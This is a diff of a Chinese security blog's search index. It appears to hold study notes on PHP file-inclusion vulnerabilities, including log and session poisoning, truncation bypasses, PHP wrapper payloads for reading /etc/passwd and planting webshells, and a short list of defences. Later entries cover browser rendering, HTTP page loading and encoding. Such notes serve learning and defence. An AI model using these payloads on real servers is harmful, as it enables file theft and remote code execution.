+<p>linux session文件在目录<code>/var/lib/php/session</code>中，可以通过phpinfo搜索<code>session_save_path</code>查看，session文件的命名规则是<code>sess_phpsessionid</code> session我们可以通过抓包获取。如果用户上传的参数被写入到session中，我们就可以利用文件包含漏洞执行恶意代码，前提是当前php中间件具有对session文件及其父目录的读权限。</p>
+<h3 id="sshlog文件包含"><a href="#sshlog文件包含" class="headerlink" title="sshlog文件包含"></a>sshlog文件包含</h3><p>利用ssh的日志信息，通过ssh登录时将恶意代码写入到用户名部分，再利用远程文件包含漏洞执行该文件。</p>
+<p>ssh默认日志路径：<code>/var/log/auth.log</code></p>
+<p>ssh登录姿势：ssh @192.168.0.102</p>
+<p>日志文件中记录</p>
+<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled.png" referrerpolicy="no-referrer"></p>
+<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled.png</p>
+<h3 id="apache2访问日志，错误日志"><a href="#apache2访问日志，错误日志" class="headerlink" title="apache2访问日志，错误日志"></a>apache2访问日志，错误日志</h3><p>日志文件路径：<code>/var/log/apache2/access.log|error.log</code></p>
+<p>利用方式：直接访问不存在的路径：<code>http://www.armandhe.com/&lt;?php phpinfo();?&gt;</code> 因为url中的数据会被编码，所以在访问的时候需要抓包后，修改上传参数为为编码的格式。</p>
+<p><strong>那么mysql的访问日志是不是也可以做同样的操作</strong></p>
+<p><strong>上述访问日志的方式有一个前提条件就是php要有读这些目录以及文件的权限</strong></p>
+<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h3 id="本地文件包含有限制的染过"><a href="#本地文件包含有限制的染过" class="headerlink" title="本地文件包含有限制的染过"></a>本地文件包含有限制的染过</h3><p>%00截断</p>
+<p>路劲长度截断</p>
+<p><strong>一个特性：linux中目录最长不超过4096字节，超出的部分将被丢弃，windows中目录最长不超过256字节，超过的将被丢弃</strong></p>
+<p>通过…………………………………………或者..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;截断</p>
+<h3 id="远程文件包含绕过"><a href="#远程文件包含绕过" class="headerlink" title="远程文件包含绕过"></a>远程文件包含绕过</h3><p>？# space空格</p>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><strong>php:&#x2F;&#x2F;filter ———-读取本地文件 只需开启allow_url_fopen</strong></p>
+<p><code>?file=php://filter/convert.base64-encode/resource=file://c:/windows/win.ini</code></p>
+<p>有些文件中包含一些特殊字符，直接用file协议可能无法读取成功，所以先进行base编码之后再来传输。</p>
+<p><strong>php:&#x2F;&#x2F;input—————读取post数据 需同时开启两个配置项</strong></p>
+<p>当代码中处理用户上传数据使用的是file_get_contents的时候就可以使用该协议</p>
+<p>该函数获取原始post请求的方式是<code>file_get_contents(&quot;php://input&quot;)</code></p>
+<p>那么我们就可以将<code>php://input</code> 作为参数传上去，而具体的post内容通过抓包更改请求头类型，添加请求体来实现。</p>
+<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%201.png" referrerpolicy="no-referrer"></p>
+<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%201.png</p>
+<p>可以直接在当前目录中写入木马，然后用蚁剑链接</p>
+<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%202.png" referrerpolicy="no-referrer"></p>
+<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%202.png</p>
+<p>或者直接执行操作系统命令</p>
+<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%203.png" referrerpolicy="no-referrer"></p>
+<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%203.png</p>
+<p><strong>file:&#x2F;&#x2F; —————读取本地文件</strong></p>
+<p><code>?file=file:///etc/passwd</code></p>
+<p><strong>data:&#x2F;&#x2F;————读取本地文件 配合file_get_contents使用</strong></p>
+<p><code>?file=data://text/plain;base64,cGhwaW5mbygpOw==</code></p>
+<p><strong>phar:&#x2F;&#x2F;————解压缩 有效</strong></p>
+<p><code>?file=phar://hack.png/hack.php</code> hack实际上是一个压缩文件，只不过后缀名在压缩完成后被手动修改伪png来绕过过滤策略，且压缩的格式必须为zip。可以配合文件上传漏洞使用</p>
+<p><strong>zip:&#x2F;&#x2F;————-解压缩 有效</strong></p>
+<p><code>?file=zip://hack.png#hack.php</code> hack文件是在hack.zip中真实存在的，hack是压缩文件压缩后修改的后缀名为png。功能和phar一样</p>
+<p><strong>测试代码</strong>fang</p>
+<p><a href="hack.zip">hack.zip</a></p>
+<p><a href="pharTest.php">pharTest.php</a></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>关闭allow_url_include</p>
+<p>将open_basedir 设置为指定目录，即只允许该目录文件被访问。</p>
+<p>设置白名单</p>
+<p>设置黑名单，过滤危险协议关键字，</p>
+<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ol>
+<li>敏感文件泄露</li>
+<li>被getshell</li>
+<li>任意命令执行</li>
+</ol>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+        <tag>PHP</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浏览器渲染原理</title>
+    <url>/2025/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/</url>
+    <content><![CDATA[<h1 id="浏览器渲染原理"><a href="#浏览器渲染原理" class="headerlink" title="浏览器渲染原理"></a>浏览器渲染原理</h1><p>用户看到页面可以分为两个阶段，页面内容加载完毕与页面资源加载完成，分别对应DOMcontentloaded 和load事件</p>
+<p>DOMcontentloaded事件触发时，仅到DOM加载完毕</p>
+<p>load事件触发时，页面上所有的dom,css,js 等其他资源全部加载完毕</p>
+<h1 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h1><ol>
+<li>浏览器解析html文档为dom树</li>
+<li>浏览器解析css文档为cssom树，css对象模型</li>
+<li>合并dom与cssom为渲染树</li>
+<li>布局</li>
+<li>将渲染树各个节点绘制到屏幕上面，这一步为绘制</li>
+</ol>
+<p><img src="/2025/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/Untitled.png" referrerpolicy="no-referrer"></p>
+<p>上述过程并不是顺序执行的，根据实际情况可能会并行、重复执行</p>
+<h2 id="DOM树构建过程"><a href="#DOM树构建过程" class="headerlink" title="DOM树构建过程"></a>DOM树构建过程</h2><ul>
+<li>DOM树在构建的过程中可能会被CSS和JS的加载而执行阻塞</li>
+<li><code>display:none</code>的元素也会在DOM树中</li>
+<li>注释也会在DOM树中</li>
+<li><code>script</code>标签会在DOM树中</li>
+</ul>
+<p>无论是DOM还是CSSOM，都是要经过Bytes→characters→tokens→nodes→object model这个过程。</p>
+<p><img src="/Untitled%201.png" referrerpolicy="no-referrer"></p>
+<p>当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。</p>
+<h2 id="构建CSS规则树"><a href="#构建CSS规则树" class="headerlink" title="构建CSS规则树"></a>构建CSS规则树</h2><p>浏览器解析CSS文件并生成CSSOM，每个CSS文件都被分析成一个StyleSheet对象，每个对象都包含CSS规则。CSS规则对象包含对应于CSS语法的选择器和声明对象以及其他对象。<br>在这个过程需要注意的是：</p>
+<ul>
+<li>CSS解析可以与DOM解析同时进行。</li>
+<li>CSS解析与<code>script</code>的执行互斥 。</li>
+<li>在Webkit内核中进行了<code>script</code>执行优化，只有在JS访问CSS时才会发生互斥。</li>
+</ul>
+<h2 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h2><p>通过DOM树和CSS规则树，浏览器就可以通过它两构建渲染树了。浏览器会先从DOM树的根节点开始遍历每个可见节点，然后对每个可见节点找到适配的CSS样式规则并应用。<br>有以下几点需要注意：</p>
+<ul>
+<li>Render Tree和DOM Tree不完全对应</li>
+<li><code>display: none</code>的元素不在Render Tree中</li>
+<li><code>visibility: hidden</code>的元素在Render Tree中</li>
+</ul>
+<p><img src="/Untitled%202.png" referrerpolicy="no-referrer"></p>
+<p>渲染树生成后，还是没有办法渲染到屏幕上，渲染到屏幕需要得到各个节点的位置信息，这就需要布局（Layout）的处理了。</p>
+<h2 id="渲染树布局"><a href="#渲染树布局" class="headerlink" title="渲染树布局"></a>渲染树布局</h2><p>布局阶段会从渲染树的根节点开始遍历，由于渲染树的每个节点都是一个Render Object对象，包含宽高，位置，背景色等样式信息。所以浏览器就可以通过这些样式信息来确定每个节点对象在页面上的确切大小和位置，布局阶段的输出就是我们常说的盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。需要注意的是：</p>
+<ul>
+<li><code>float</code>元素，<code>absoulte</code>元素，<code>fixed</code>元素会发生位置偏移。</li>
+<li>我们常说的脱离文档流，其实就是脱离Render Tree。</li>
+</ul>
+<h2 id="渲染树绘制"><a href="#渲染树绘制" class="headerlink" title="渲染树绘制"></a>渲染树绘制</h2><p>在绘制阶段，浏览器会遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。</p>
+<h1 id="浏览器核心部件"><a href="#浏览器核心部件" class="headerlink" title="浏览器核心部件"></a>浏览器核心部件</h1><p><img src="/Untitled%203.png" referrerpolicy="no-referrer"></p>
+<p>主流的渲染引擎有webkit&#x2F;Gecko</p>
+<h1 id="渲染机制的补充"><a href="#渲染机制的补充" class="headerlink" title="渲染机制的补充"></a>渲染机制的补充</h1><h2 id="渲染阻塞"><a href="#渲染阻塞" class="headerlink" title="渲染阻塞"></a>渲染阻塞</h2><h3 id="js渲染阻塞"><a href="#js渲染阻塞" class="headerlink" title="js渲染阻塞"></a>js渲染阻塞</h3><p>JS可以操作DOM来修改DOM结构，可以操作CSSOM来修改节点样式，这就导致了浏览器在遇到<code>&lt;script&gt;</code>标签时，DOM构建将暂停，直至脚本完成执行，然后继续构建DOM。如果脚本是外部的，会等待脚本下载完毕，再继续解析文档。现在可以在<code>script</code>标签上增加属性<code>defer</code>或者<code>async</code>。脚本解析会将脚本中改变DOM和CSS的地方分别解析出来，追加到DOM树和CSSOM规则树上。</p>
+<h3 id="css渲染阻塞"><a href="#css渲染阻塞" class="headerlink" title="css渲染阻塞"></a>css渲染阻塞</h3><p>由于CSSOM负责存储渲染信息，浏览器就必须保证在合成渲染树之前，CSSOM是完备的，这种完备是指所有的CSS（内联、内部和外部）都已经下载完，并解析完，只有CSSOM和DOM的解析完全结束，浏览器才会进入下一步的渲染，这就是CSS阻塞渲染。</p>
+<p>CSS阻塞渲染意味着，在CSSOM完备前，页面将一直处理白屏状态，这就是为什么样式放在<code>head</code>中，仅仅是为了更快的解析CSS，保证更快的首次渲染。</p>
+<h2 id="回流"><a href="#回流" class="headerlink" title="回流"></a>回流</h2><p>当页面的布局发生改变的时候，必然会触发回流，触发回流必然会触发重绘</p>
+<h2 id="重绘"><a href="#重绘" class="headerlink" title="重绘"></a>重绘</h2><p>当元素的背景颜色，背景色、边框颜色等发生变化的时候，会触发重绘</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>浏览器</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
+        <tag>渲染</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浏览器访问网站过程</title>
+    <url>/2025/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h1 id="浏览器访问网站过程"><a href="#浏览器访问网站过程" class="headerlink" title="浏览器访问网站过程"></a>浏览器访问网站过程</h1><h1 id="QUESTION1：浏览器访问网站的过程"><a href="#QUESTION1：浏览器访问网站的过程" class="headerlink" title="QUESTION1：浏览器访问网站的过程"></a>QUESTION1：浏览器访问网站的过程</h1><h2 id="step1：缓存查找"><a href="#step1：缓存查找" class="headerlink" title="step1：缓存查找"></a>step1：缓存查找</h2><p>如果改页面在短时间内被访问过，则会经过缓存茶盏来判断是否需要请求新的资源，根据max-age、expires、cache-control、if-none-match、last-modifiled、etoken等来判断是走浏览器缓存还是向服务器请求数据，走浏览器缓存则直接返回数据，响应状态设置为灰色的200。</p>
+<h2 id="step1：域名解析"><a href="#step1：域名解析" class="headerlink" title="step1：域名解析"></a>step1：域名解析</h2><hr>
+<p>首先浏览器需要做域名解析，在浏览器本地的缓存中寻找是否又该域名的解析，如果没有，则到主机的缓存中去寻找，如果也没有，就到主机的hosts文件中去寻找，如果仍然没有则到路由器中找，如果还没有则根据指定的本地dns地址到指定的本地域名服务器上去寻找，如果没有寻找到，则到缓存中去找，如果也没有且如果配置了转发的话，则会把这个请求转发到该域名服务器的上一级域名服务器解析，上一级域名服务器如果也没有寻找到要么再到上一级或者到根服务器去寻找，这个过程叫做<code>递归查询</code>。根服务器告知主机负责解析顶级域名的服务器的地址，顶级域名服务器告知负责二级域名解析的服务器的地址，二级域名解析服务器告知三级域名解析的服务器的地址，依次迭代，直到找到该域名的解析为止，这个过程叫做<code>迭代查询</code>。</p>
+<h2 id="step2：建立tcp连接"><a href="#step2：建立tcp连接" class="headerlink" title="step2：建立tcp连接"></a>step2：建立tcp连接</h2><hr>
+<p>域名解析完成后，开始建立tcp连接，连接时进行三次握手，首先客户端发送syn报文，将标志位syn设为1，同步序列号设为x,进入syn_send状态，服务器收到请求后回一个ack报文，其中标志位syn设为1，ack标志位设为1，同步序列号设为y,确认号设为x+1，进入syn_recieve状态，客户端收到确认报文之后，发送确认报文到服务器，ack标志位设为1，确认号设为y+1,进入established状态，此时tcp连接建立完毕。</p>
+<h2 id="step3：发送请求"><a href="#step3：发送请求" class="headerlink" title="step3：发送请求"></a>step3：发送请求</h2><hr>
+<p>tcp连接建立后开始开始传送http协议数据内容，经过tcp&#x2F;ip协议五层层层封装，数据首先在五层编码成二进制，再到4层经过tcp层加上5层协议的端口号，根据数据链路层MTU对数据进行分段，然后到3层加上ip地址与4层协议号，然后数据到了三层后，首先判断目标ip地址是不是与本机处在同一网段，如果是在同一网段，则查询arp缓存表，或者进行arp广播，如果没有在同一网段则根据本机配置的网关地址，查询arp缓存表或者广播查询网关的mac地址，完成后封装帧头帧尾，然后数据被发送网关，由网关进行地址转换，然后层层路由到服务器端。</p>
+<h2 id="step4：服务器解析请求，发送数据"><a href="#step4：服务器解析请求，发送数据" class="headerlink" title="step4：服务器解析请求，发送数据"></a>step4：服务器解析请求，发送数据</h2><hr>
+<p>服务器根据请求内容返回相应内容，如果请求的是静态网页，将直接由web中间件根据url中请求的内容返回对应的数据，如果请求的是动态的页面，则web中间件将请求通过socket发送到动态脚本解析器解析执行，解析器若发现需要查询数据库，则会连接数据库进行查询并将数据添加到结果中，脚本解析器解析完后，将数据发回给web中间件，web中间件再发回给浏览器。</p>
+<h2 id="step5：断开连接"><a href="#step5：断开连接" class="headerlink" title="step5：断开连接"></a>step5：断开连接</h2><hr>
+<p>当浏览器没有要发送的数据时，服务器首先发送一个结束报文，我们称其为执行主动关闭，该报文中fin标志位设置为1，ack标志位设置位1，syn标志位设置位0，同步序列号为x,确认号设置为z,此时服务器关闭其发送数据服务，但仍然可以接受来自浏览器的数据，浏览器接收到后回复服务器一个ack报文，表示已经接收到了服务器的结束连接请求，设置ack标志位为1，syn标志位位0，fin标志位为0，同步序列号为z,此时如果浏览器仍然有请求，仍然可以发送给服务器，等到浏览器没有请求发送后，其会发送一个带有fin+ack标志位的包给服务器，并设置确认号位X，同步序列号位Y表示没有数据再发送给服务器了，进入lask_ack状态，当服务器收到该报文后，发送一个带有ack标记的包给浏览器，同步序列号设置为X，此时服务其进入最终确认状态fn_ack ,待等待了2msl(2倍报文最大生存时间)后，服务器释放连接。</p>
+<h2 id="step6：浏览器解析、渲染数据"><a href="#step6：浏览器解析、渲染数据" class="headerlink" title="step6：浏览器解析、渲染数据"></a>step6：浏览器解析、渲染数据</h2><hr>
+<p>客户端收到数据后，经过层层的解封装、重组等操作最终将数据发送到浏览器。浏览器接受到数据后首先将html代码构造成DOM树，css文件构造成CSSOM,这两个过程是同步进行，然后浏览器合并这两棵树，生成渲染树，最后进行重构，渲染等操作得到我们看到的网页</p>
+<h1 id="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"><a href="#QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？" class="headerlink" title="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"></a>QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？</h1><p><strong>共有655356个端口</strong></p>
+<ol>
+<li>0-1023 公认端口，一般都有特殊的含义，个人在分配端口的时候一般不使用这些端口</li>
+<li>1024-49151 注册端口：这些端口可以用于绑定一些服务</li>
+<li>49152-65535 私有端口：这些端口我们在测试的过程中可以使用</li>
+</ol>
+<h1 id="QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？"><a href="#QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？" class="headerlink" title="QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？"></a>QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？</h1><p>一般用作测试用，可以用于测试本机的网络配置是否成功，可以用于本机应用间的通信</p>
+<h1 id="QUESTION3：部署网站的体会"><a href="#QUESTION3：部署网站的体会" class="headerlink" title="QUESTION3：部署网站的体会"></a>QUESTION3：部署网站的体会</h1><p>我在部署过程中遇到的一个问题就是PHP版本不匹配的问题，我使用的PHP版本时7.3，这个版本的PHP与老的版本的PHP有较大的差别，就我所知道的，7.3版本里面单条mysql单条查询语句的执行函数时mysqli_query(),而老版本的PHP中确是mysql_qurey，所以我在发布网站之后，访问页面是一片空白。这个问题我在部署sqli_labs的时候也遇到过，不过当时有报错信息，所以我很快就找到了问题的根源，但这次却没有报错信息，所以浪费了很多的时间，还向刘俊岑请教了一下，我方才大彻大悟，可能是PHP版本不兼容导致的， 在我使用了低版本的PHP后，这个问题果然被解决了。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>浏览器</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浏览器编码与解码</title>
+    <url>/2025/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="浏览器编码与解码"><a href="#浏览器编码与解码" class="headerlink" title="浏览器编码与解码"></a>浏览器编码与解码</h1><h1 id="访问网站过程中涉及的编解码"><a href="#访问网站过程中涉及的编解码" class="headerlink" title="访问网站过程中涉及的编解码"></a>访问网站过程中涉及的编解码</h1><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>在url中如果在参数部分出现&#x2F;等特殊字符，会导致浏览器对资源路径的错误判断，为了解决这个问题，引入了url编码这一概念，它是以%加字符的ascii码对应的二位十六进制数如 ‘&#x3D;%23 space&#x3D;%20 </p>
+<h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><p>在html中有一些字符是需要预留的，如&lt; &amp; 等，如果用户输入这些字符后被直接输出到html中，则可能导致浏览器在创建dom树的时候错误的识别标签的开始，从而导致错误。于是引入了html编码，有两种类型，被称为HTML编码与HTML编号。如&lt;可以被表示为：&lt;,&#60;,&#x3c;</p>
+<p><code>注意：</code>&amp;开头 ;结尾</p>
+<p>JS编码</p>
+<p>js编码采用unicode字符集，四个字节表示一个字符</p>
+<p>js常见的反斜杠方式编码处理</p>
+<ul>
+<li>\b退格符，\t制表符，\v垂直制表符等；</li>
+<li>三位数字，不足位数用0补充，按8位原字符八进制字符编码；</li>
+<li>两位数字，不足位数用0补充，按8位原字符16进制字符编码，前缀 x</li>
+<li>四位数字，不足为数用0补充，按16位原字符16进制Unicode数值编码，前缀 u 。</li>
+</ul>
+<p>如\145、\x65和\u0065都代表字符e。</p>
+<h1 id="浏览器解码顺序"><a href="#浏览器解码顺序" class="headerlink" title="浏览器解码顺序"></a>浏览器解码顺序</h1><h2 id="URL解码"><a href="#URL解码" class="headerlink" title="URL解码"></a>URL解码</h2><p>url解码过程较为简单，服务器对接收到用户传输过来的URL进行解析，遇到%便自动进行解码。</p>
+<h2 id="HTML解码"><a href="#HTML解码" class="headerlink" title="HTML解码"></a>HTML解码</h2><p>HTML解析器其实是一个状态机，在对HTML资源从上而下进行解析时遇到一个‘&lt;‘符号就会进入标签开始状态（Tag Open State），然后搜寻标签，img可以被识别为正确的标签，img1则不会识别，最后在读到最近的一个‘&gt;’时，结束标签状态进入数据状态（Data State）。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;<span class="symbol">&amp;#104;</span>1&gt;Main Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //无效代码</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>M<span class="symbol">&amp;#97;</span>inT<span class="symbol">&amp;#105;</span>tle<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //有效代码</span><br></pre></td></tr></table></figure>
+
+<p>上例中，第一条不会被正常解析，第二条会被正常解析，由此可将<code>html实体编码的解码是发生在DOM树构建完成后才进行的</code>，<code>故html实体编码只能出现在数据区域，不能出现在标签开始状态与结束状态，这两种状态都不会被成功解码</code>。这很重要</p>
+<h2 id="JS解码"><a href="#JS解码" class="headerlink" title="JS解码"></a>JS解码</h2><p>得到一个html文档后，浏览器顺序构造dom树与cssom树，当遇到一个<script>标签后，dom构建被阻塞，等待js文件被加载完毕，执行完毕，之后继续构建dom树</p>
+<p><strong>为什么现在的js代码被放在最后面？</strong></p>
+<p>因为js代码会修改并阻塞dom的渲染，若js代码放在header中则在js执行完毕之前 ，浏览器窗口会显示一片空白，用户体验差，将js代码放在最后，能提供更好的用户体验</p>
+<p>js的脚本处理模型是按照源码处理-函数解析-代码执行这个执行流来的，重点是，先解码再执行，故可对js代码中的任意内容进行编码，js都能被成功执行。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>浏览器</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
+        <tag>编解码</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>浏览器缓存机制</title>
     <url>/2025/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/</url>
     <content><![CDATA[<h1 id="浏览器缓存机制"><a href="#浏览器缓存机制" class="headerlink" title="浏览器缓存机制"></a>浏览器缓存机制</h1><p>本笔记参考</p>
@@ -3417,112 +3438,6 @@
       <tags>
         <tag>浏览器</tag>
         <tag>缓存</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>浏览器编码与解码</title>
-    <url>/2025/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/</url>
-    <content><![CDATA[<h1 id="浏览器编码与解码"><a href="#浏览器编码与解码" class="headerlink" title="浏览器编码与解码"></a>浏览器编码与解码</h1><h1 id="访问网站过程中涉及的编解码"><a href="#访问网站过程中涉及的编解码" class="headerlink" title="访问网站过程中涉及的编解码"></a>访问网站过程中涉及的编解码</h1><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>在url中如果在参数部分出现&#x2F;等特殊字符，会导致浏览器对资源路径的错误判断，为了解决这个问题，引入了url编码这一概念，它是以%加字符的ascii码对应的二位十六进制数如 ‘&#x3D;%23 space&#x3D;%20 </p>
-<h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><p>在html中有一些字符是需要预留的，如&lt; &amp; 等，如果用户输入这些字符后被直接输出到html中，则可能导致浏览器在创建dom树的时候错误的识别标签的开始，从而导致错误。于是引入了html编码，有两种类型，被称为HTML编码与HTML编号。如&lt;可以被表示为：&lt;,&#60;,&#x3c;</p>
-<p><code>注意：</code>&amp;开头 ;结尾</p>
-<p>JS编码</p>
-<p>js编码采用unicode字符集，四个字节表示一个字符</p>
-<p>js常见的反斜杠方式编码处理</p>
-<ul>
-<li>\b退格符，\t制表符，\v垂直制表符等；</li>
-<li>三位数字，不足位数用0补充，按8位原字符八进制字符编码；</li>
-<li>两位数字，不足位数用0补充，按8位原字符16进制字符编码，前缀 x</li>
-<li>四位数字，不足为数用0补充，按16位原字符16进制Unicode数值编码，前缀 u 。</li>
-</ul>
-<p>如\145、\x65和\u0065都代表字符e。</p>
-<h1 id="浏览器解码顺序"><a href="#浏览器解码顺序" class="headerlink" title="浏览器解码顺序"></a>浏览器解码顺序</h1><h2 id="URL解码"><a href="#URL解码" class="headerlink" title="URL解码"></a>URL解码</h2><p>url解码过程较为简单，服务器对接收到用户传输过来的URL进行解析，遇到%便自动进行解码。</p>
-<h2 id="HTML解码"><a href="#HTML解码" class="headerlink" title="HTML解码"></a>HTML解码</h2><p>HTML解析器其实是一个状态机，在对HTML资源从上而下进行解析时遇到一个‘&lt;‘符号就会进入标签开始状态（Tag Open State），然后搜寻标签，img可以被识别为正确的标签，img1则不会识别，最后在读到最近的一个‘&gt;’时，结束标签状态进入数据状态（Data State）。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;<span class="symbol">&amp;#104;</span>1&gt;Main Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //无效代码</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>M<span class="symbol">&amp;#97;</span>inT<span class="symbol">&amp;#105;</span>tle<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //有效代码</span><br></pre></td></tr></table></figure>
-
-<p>上例中，第一条不会被正常解析，第二条会被正常解析，由此可将<code>html实体编码的解码是发生在DOM树构建完成后才进行的</code>，<code>故html实体编码只能出现在数据区域，不能出现在标签开始状态与结束状态，这两种状态都不会被成功解码</code>。这很重要</p>
-<h2 id="JS解码"><a href="#JS解码" class="headerlink" title="JS解码"></a>JS解码</h2><p>得到一个html文档后，浏览器顺序构造dom树与cssom树，当遇到一个<script>标签后，dom构建被阻塞，等待js文件被加载完毕，执行完毕，之后继续构建dom树</p>
-<p><strong>为什么现在的js代码被放在最后面？</strong></p>
-<p>因为js代码会修改并阻塞dom的渲染，若js代码放在header中则在js执行完毕之前 ，浏览器窗口会显示一片空白，用户体验差，将js代码放在最后，能提供更好的用户体验</p>
-<p>js的脚本处理模型是按照源码处理-函数解析-代码执行这个执行流来的，重点是，先解码再执行，故可对js代码中的任意内容进行编码，js都能被成功执行。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>浏览器</category>
-      </categories>
-      <tags>
-        <tag>浏览器</tag>
-        <tag>编解码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>浏览器访问网站过程</title>
-    <url>/2025/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h1 id="浏览器访问网站过程"><a href="#浏览器访问网站过程" class="headerlink" title="浏览器访问网站过程"></a>浏览器访问网站过程</h1><h1 id="QUESTION1：浏览器访问网站的过程"><a href="#QUESTION1：浏览器访问网站的过程" class="headerlink" title="QUESTION1：浏览器访问网站的过程"></a>QUESTION1：浏览器访问网站的过程</h1><h2 id="step1：缓存查找"><a href="#step1：缓存查找" class="headerlink" title="step1：缓存查找"></a>step1：缓存查找</h2><p>如果改页面在短时间内被访问过，则会经过缓存茶盏来判断是否需要请求新的资源，根据max-age、expires、cache-control、if-none-match、last-modifiled、etoken等来判断是走浏览器缓存还是向服务器请求数据，走浏览器缓存则直接返回数据，响应状态设置为灰色的200。</p>
-<h2 id="step1：域名解析"><a href="#step1：域名解析" class="headerlink" title="step1：域名解析"></a>step1：域名解析</h2><hr>
-<p>首先浏览器需要做域名解析，在浏览器本地的缓存中寻找是否又该域名的解析，如果没有，则到主机的缓存中去寻找，如果也没有，就到主机的hosts文件中去寻找，如果仍然没有则到路由器中找，如果还没有则根据指定的本地dns地址到指定的本地域名服务器上去寻找，如果没有寻找到，则到缓存中去找，如果也没有且如果配置了转发的话，则会把这个请求转发到该域名服务器的上一级域名服务器解析，上一级域名服务器如果也没有寻找到要么再到上一级或者到根服务器去寻找，这个过程叫做<code>递归查询</code>。根服务器告知主机负责解析顶级域名的服务器的地址，顶级域名服务器告知负责二级域名解析的服务器的地址，二级域名解析服务器告知三级域名解析的服务器的地址，依次迭代，直到找到该域名的解析为止，这个过程叫做<code>迭代查询</code>。</p>
